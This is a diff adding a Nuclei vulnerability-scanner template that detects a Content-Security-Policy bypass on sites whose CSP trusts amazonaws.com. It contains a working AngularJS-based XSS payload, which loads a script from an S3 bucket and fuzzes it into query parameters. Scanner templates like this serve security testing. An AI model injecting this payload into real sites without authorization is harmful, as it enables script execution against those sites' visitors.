@@ -1,0 +1,55 @@
+id: amazon-s3-elysium-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Amazon S3 Elysium
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,amazon-s3-elysium
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "amazonaws.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: amazon_s3_elysium_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "amazon_s3_elysium_csp_xss == true"
+# digest: 4a0a0047304502200ab07103fb8515b759f279cfc22e456d8552b3355c0172f12391771cb22d83eb022100a8fcd5cc6ae344370c793fb56bf0abc5f0bbea15b716130ab78457bc5f6f340c:922c64590222798bb761d5b6d8e72950
